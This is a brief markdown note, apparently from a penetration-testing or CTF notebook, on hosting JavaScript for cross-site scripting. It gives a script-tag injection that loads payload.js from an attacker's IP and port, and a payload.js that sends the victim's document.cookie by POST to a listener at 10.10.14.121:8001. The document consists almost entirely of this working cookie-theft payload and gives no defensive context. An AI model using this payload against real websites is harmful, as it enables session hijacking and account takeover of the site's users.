# host javascript

Inject javascript via script tag:

```
<script src=http://IP:PORT/payload.js></script>
```

## payload.js

Start netcat lister on Port 8001:

```
const xhr = new XMLHttpRequest();
const url='http://10.10.14.121:8001';
xhr.open("POST", url,true);
xhr.send(document.cookie);
```
